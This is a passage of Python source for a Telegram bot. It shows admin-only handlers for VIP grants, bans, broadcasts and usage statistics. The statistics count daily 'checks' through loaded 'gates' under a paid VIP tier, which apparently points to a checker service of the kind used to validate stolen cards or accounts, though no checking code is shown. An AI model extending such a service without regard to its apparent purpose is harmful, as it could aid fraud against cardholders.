    save_users_data(users_data)
    
    bot.reply_to(message, f"✅ User {target_id} added as VIP!\nExpiry: {expiry_str}")
    try:
        bot.send_message(target_id, f"🎉 VIP activated for {days} days!\nExpiry: {expiry_str}")
    except:
        pass

@bot.message_handler(commands=["ban"])
def ban_user_cmd(message):
    if str(message.chat.id) != str(ADMIN_ID):
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /ban [user_id] [hours]\nExample: /ban 5831292144 24\nUse 0 for permanent")
        return
    
    target_id = args[1]
    hours = int(args[2]) if len(args) > 2 else 24
    reason = " ".join(args[3:]) if len(args) > 3 else "Violation of rules"
    
    duration = ban_user(target_id, hours, reason)
    bot.reply_to(message, f"✅ User {target_id} banned for {duration}")
    
    try:
        bot.send_message(target_id, f"⛔ BANNED\nReason: {reason}\nDuration: {duration}")
    except:
        pass

@bot.message_handler(commands=["unban"])
def unban_user_cmd(message):
    if str(message.chat.id) != str(ADMIN_ID):
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /unban [user_id]")
        return
    
    target_id = args[1]
    if unban_user(target_id):
        bot.reply_to(message, f"✅ User {target_id} unbanned!")
    else:
        bot.reply_to(message, f"❌ User {target_id} is not banned.")

@bot.message_handler(commands=["bannedlist"])
def banned_list(message):
    if str(message.chat.id) != str(ADMIN_ID):
        return
    
    banned = load_banned()
    if not banned:
        bot.reply_to(message, "📋 No banned users.")
        return
    
    text = "📋 BANNED USERS\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, info in banned.items():
        until = info.get('banned_until', 'Permanent')
        text += f"ID: {uid}\nUntil: {until}\nReason: {info.get('reason', 'Unknown')}\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
    
    bot.reply_to(message, text[:4000])

@bot.message_handler(commands=["broadcast"])
def broadcast(message):
    if str(message.chat.id) != str(ADMIN_ID):
        return
    
    msg_text = message.text.replace("/broadcast ", "")
    if not msg_text or msg_text == "/broadcast":
        bot.reply_to(message, "Usage: /broadcast [message]")
        return
    
    users_data = load_users_data()
    all_users = list(users_data['allowed_users'].keys())
    if str(ADMIN_ID) not in all_users:
        all_users.append(str(ADMIN_ID))
    
    success = 0
    fail = 0
    for user_id in all_users:
        try:
            bot.send_message(user_id, f"📢 ADMIN BROADCAST:\n\n{msg_text}")
            success += 1
        except:
            fail += 1
    
    bot.reply_to(message, f"✅ Broadcast sent!\nSuccess: {success}\nFailed: {fail}")

@bot.message_handler(commands=["stats"])
def stats(message):
    if str(message.chat.id) != str(ADMIN_ID):
        return
    
    users_data = load_users_data()
    total_users = len(users_data['allowed_users'])
    banned = load_banned()
    total_banned = len(banned)
    
    limits = load_limits()
    today = get_today_key()
    today_checks = 0
    for uid, days in limits.items():
        if today in days:
            today_checks += days[today].get('count', 0)
    
    bot.reply_to(message, f"""
📊 BOT STATISTICS
━━━━━━━━━━━━━━━━━━━━━━━━
👥 Total Users: {total_users}
⛔ Banned: {total_banned}
📊 Today's Checks: {today_checks}
⚙️ Active Gates: {len(GATE_MODULES)}
💎 Daily Limit: {DAILY_LIMIT}
━━━━━━━━━━━━━━━━━━━━━━━━
""")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("=" * 40)
    print("🤖 GOOD HQ BOT STARTED")
    print("=" * 40)
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"📊 Daily Limit: {DAILY_LIMIT}")
    print(f"⚙️ Gates Loaded: {len(GATE_MODULES)}")
    print(f"📁 Results Dir: {RESULTS_DIR}")
    print("=" * 40)
    print("✅ Bot is running...")
    print("=" * 40)
    
    bot.delete_webhook()
    bot.infinity_polling()
